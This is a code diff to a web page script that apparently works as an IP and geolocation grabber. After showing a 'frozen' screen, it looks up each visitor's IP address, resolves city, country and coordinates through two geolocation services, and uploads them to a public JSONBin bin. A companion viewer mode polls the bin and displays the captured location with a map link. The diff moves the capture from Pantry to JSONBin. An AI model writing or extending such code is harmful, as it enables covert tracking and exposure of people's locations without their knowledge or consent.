@@ -52,9 +52,12 @@
     </div>
 
     <script>
-        const PANTRY_BASE = "https://getpantry.cloud/apiv1/pantry/";
-        let ROOM = localStorage.getItem("xenon_room") || "";
+        // Switched to JSONBin.io - free, no auth for public bins, reliable in 2026
+        // We use a fixed public bin per room (create if not exists via PUT/POST)
+        const JSONBIN_BASE = "https://api.jsonbin.io/v3/b/";
+        let BIN_ID = localStorage.getItem("xenon_bin") || ""; // we'll create once
 
+        let ROOM = localStorage.getItem("xenon_room") || "";
         if (!ROOM) {
             ROOM = "xenon-" + Math.random().toString(36).slice(2, 9);
             localStorage.setItem("xenon_room", ROOM);
@@ -65,6 +68,30 @@
             document.getElementById("landing").style.display = "none";
             document.getElementById("frozen").style.display = "flex";
             setTimeout(captureAndUpload, 12000);
+        }
+
+        async function createOrGetBin() {
+            if (BIN_ID) return BIN_ID;
+
+            try {
+                const res = await fetch(JSONBIN_BASE, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json", "private": "false" }, // public bin
+                    body: JSON.stringify({ ip: "init", geo: {}, ts: Date.now() }) // dummy init
+                });
+                if (res.ok) {
+                    const data = await res.json();
+                    BIN_ID = data.id;
+                    localStorage.setItem("xenon_bin", BIN_ID);
+                    console.log("Created new public bin:", BIN_ID);
+                    return BIN_ID;
+                } else {
+                    console.error("Bin creation failed:", res.status);
+                }
+            } catch (e) {
+                console.error("Bin create error:", e);
+            }
+            return null;
         }
 
         async function captureAndUpload() {
@@ -78,11 +105,11 @@
                 try {
                     const geoRes = await fetch(`https://ipapi.co/${ip}/json/`);
                     geo = await geoRes.json();
-                } catch (e) { console.warn("ipapi failed, trying fallback"); }
+                } catch {}
 
                 if (geo.error || !geo.latitude) {
-                    const fallbackRes = await fetch(`https://ip-api.com/json/${ip}`);
-                    geo = await fallbackRes.json();
+                    const fallback = await fetch(`https://ip-api.com/json/${ip}`);
+                    geo = await fallback.json();
                 }
 
                 if (!geo.error && geo.status !== "fail") {
@@ -94,19 +121,20 @@
                     };
                     console.log("Geo data:", geoData);
 
-                    const uploadRes = await fetch(PANTRY_BASE + ROOM, {
-                        method: "POST",
+                    const bin = await createOrGetBin();
+                    if (!bin) return;
+
+                    const uploadRes = await fetch(JSONBIN_BASE + bin, {
+                        method: "PUT", // update/overwrite
                         headers: { "Content-Type": "application/json" },
                         body: JSON.stringify({ ip, geo: geoData, ts: Date.now() })
                     });
 
                     if (uploadRes.ok) {
-                        console.log("Upload success!");
+                        console.log("Upload success to JSONBin!");
                     } else {
                         console.error("Upload failed - status:", uploadRes.status);
                     }
-                } else {
-                    console.warn("No valid geo");
                 }
             } catch (e) {
                 console.error("Capture/upload error:", e.message);
@@ -126,35 +154,36 @@
             const update = async () => {
                 status.textContent = "Fetching from server...";
                 try {
-                    const res = await fetch(PANTRY_BASE + ROOM);
-                    if (!res.ok) {
-                        throw new Error(`HTTP ${res.status}`);
-                    }
+                    const bin = BIN_ID || await createOrGetBin(); // fallback create
+                    if (!bin) throw new Error("No bin ID");
+
+                    const res = await fetch(JSONBIN_BASE + bin + "/latest");
+                    if (!res.ok) throw new Error(`HTTP ${res.status}`);
                     const data = await res.json();
 
-                    if (data.ip) {
-                        ipEl.textContent = data.ip;
-                        const g = data.geo || {};
+                    if (data.record && data.record.ip) {
+                        ipEl.textContent = data.record.ip;
+                        const g = data.record.geo || {};
                         geoEl.innerHTML = `${g.city || "?"} • ${g.country || "?"}<br>${(g.lat||0).toFixed(6)}, ${(g.lon||0).toFixed(6)}`;
                         if (g.lat && g.lon) {
                             mapEl.href = `https://www.openstreetmap.org/?mlat=${g.lat}&mlon=${g.lon}#map=15/${g.lat}/${g.lon}`;
                             mapEl.style.display = "block";
                         }
-                        status.textContent = `Room: ${ROOM} • Last capture: ${new Date(data.ts).toLocaleString()}`;
-                        console.log("Loaded data:", data);
+                        status.textContent = `Room: ${ROOM} • Last capture: ${new Date(data.record.ts).toLocaleString()}`;
+                        console.log("Loaded data:", data.record);
                     } else {
                         ipEl.textContent = "NO DATA YET";
                         status.textContent = "Room is empty - click ENTER on a device first";
                     }
                 } catch (e) {
                     ipEl.textContent = "FETCH ERROR";
-                    status.textContent = `Could not reach server: ${e.message}\n(Check console / host online / rate limit?)`;
+                    status.textContent = `Could not reach server: ${e.message}\n(Host online? Check console for details)`;
                     console.error("Fetch failed:", e);
                 }
             };
 
             await update();
-            setInterval(update, 8000); // retry every 8s
+            setInterval(update, 8000);
         }
 
         function checkHash() {
